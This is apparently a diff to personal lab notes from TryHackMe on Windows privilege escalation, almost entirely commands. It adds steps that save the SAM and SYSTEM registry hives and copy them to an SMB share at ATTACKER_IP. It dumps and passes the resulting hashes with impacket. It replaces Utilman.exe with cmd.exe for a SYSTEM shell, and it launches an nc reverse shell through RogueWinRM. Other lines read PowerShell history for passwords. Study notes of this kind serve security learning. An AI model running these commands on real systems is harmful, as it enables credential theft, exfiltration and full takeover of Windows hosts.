@@ -1,4 +1,4 @@
-### Harvesting Password
+#### Harvesting Password
   #### Powershell History　　－　in cmd
     type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
     // To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 
@@ -63,6 +63,28 @@
      accesschk64.exe -qlc xxx
      //generate reversehll file , grant privi,modify config of service 
      sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem  // localsystem is high privi of a local host.
-     
+  #### Windows Privileges - SeBackup / SeRestore
+    whoami /priv
+      SeBackupPrivilege             Back up files and directories  Disabled
+      SeRestorePrivilege            Restore files and directories  Disabled
+    reg save hklm\system C:\Users\THMBackup\system.hive
+    reg save hklm\sam C:\Users\THMBackup\sam.hive
+
+    //on attack host, set a smb server
+      impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share  //make sure impacket installed on kali
+
+    C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+    C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+
+    impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+    impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.201.91.4
+
+  #### Windows Privileges - SeTakeOwnership
+    takeown /f C:\Windows\System32\Utilman.exe
+    icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+    C:\Windows\System32\> copy cmd.exe utilman.exe
+    //lock account, then click ease of access button , will get a shell with system
     
-    
+  
+  #### Windows Privileges - SeImpersonate / SeAssignPrimaryToken
+    RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
